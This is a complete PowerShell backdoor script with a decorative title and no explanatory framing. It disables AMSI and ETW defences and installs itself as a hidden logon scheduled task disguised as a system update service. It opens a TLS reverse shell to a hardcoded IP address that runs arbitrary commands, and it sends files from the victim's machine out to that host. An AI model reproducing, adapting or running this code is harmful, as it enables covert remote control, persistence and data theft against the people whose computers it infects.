# === EYELINER AND A DREAM ===

try {
    $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsiField = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
    $amsiField.SetValue($null, $true)

    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    $etwField = $etwType.GetField('etwProvider', 'NonPublic,Static')
    $etwField.SetValue($null, $null)
} catch {}

$h0 = '72.226.70.54'
$p0 = 60068
$p1 = 60066
$t0 = Get-Random -Minimum 5 -Maximum 10
$t1 = Get-Random -Minimum 120 -Maximum 300
$t2 = 10
$hb = "ping"

try {
    $taskName = "SysUpdateSvc"
    $scriptPath = "$env:APPDATA\WinUpdate.ps1"
    $payload = $MyInvocation.MyCommand.Definition
    Copy-Item -Path $payload -Destination $scriptPath -Force
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "System Update Service" -Force
} catch {}

function rcv {
    param([System.Net.Security.SslStream]$s)
    $s.ReadTimeout = 5000
    $b = New-Object Byte[] 1024
    $d = New-Object System.Collections.Generic.List[Byte]
    while ($true) {
        try {
            $r = $s.Read($b, 0, $b.Length)
            if ($r -le 0) { break }
            $d.AddRange($b[0..($r - 1)])
            if ($r -lt 1024) { break }
        } catch { break }
    }
    return [System.Text.Encoding]::UTF8.GetString($d.ToArray())
}
function snd {
    param([System.Net.Security.SslStream]$s, [string]$d)
    try {
        $b = [System.Text.Encoding]::UTF8.GetBytes($d)
        $s.Write($b, 0, $b.Length)
        $s.Flush()
    } catch {}
}

function sh {
    param([System.Net.Sockets.TcpClient]$c)
    $callback = { param($sender, $cert, $chain, $errors) return $true }
    $s = New-Object System.Net.Security.SslStream($c.GetStream(), $false, $callback)
    $s.AuthenticateAsClient($h0)
    while ($true) {
        $cmd = rcv $s
        if (!$cmd) { break }
        if ($cmd.ToLower().Trim() -eq "exit") { break }
        if ($cmd.ToLower().Trim() -eq $hb) { snd $s "[+] Alive`n"; continue }

        if ($cmd.ToLower().StartsWith("cd ")) {
            $p = $cmd.Substring(3).Trim().Trim('"', "'")
            try {
                Set-Location -Path $p
                snd $s "[+] Changed directory to $(Get-Location)`n"
            } catch { snd $s "[-] $_`n" }
        } elseif ($cmd.ToLower().StartsWith("upload ")) {
            try {
                $path = $cmd.Substring(7).Trim().Trim('"', "'")
                foreach ($f in Get-ChildItem $path -File) {
                    $n = $f.FullName
                    Invoke-WebRequest -Uri "http://$h0`:$p1/" -Method Post -InFile $n -UseBasicParsing
                }
                snd $s "[+] Upload complete`n"
            } catch { snd $s "[-] Upload failed: $_`n" }
        } else {
            try {
                $o = Invoke-Expression $cmd 2>&1 | Out-String
                if (!$o) { $o = "[+] No output.`n" }
                snd $s $o
            } catch {
                snd $s "[-] $_`n"
            }
        }
    }
    $s.Close()
    $c.Close()
}

function cx {
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $r = $c.BeginConnect($h0, $p0, $null, $null)
        $ok = $r.AsyncWaitHandle.WaitOne($t2 * 1000, $false)
        if ($ok) {
            $c.EndConnect($r)
            return $c
        } else {
            $c.Close()
            return $null
        }
    } catch { return $null }
}

function m {
    $first = $true
    while ($true) {
        $cli = cx
        if ($cli) {
            sh $cli
        }
        if ($first) {
            Start-Sleep -Seconds $t0
            $first = $false
        } else {
            $retry = Get-Random -Minimum $t1 -Maximum ($t1 + 60)
            Start-Sleep -Seconds $retry
        }
    }
}

m
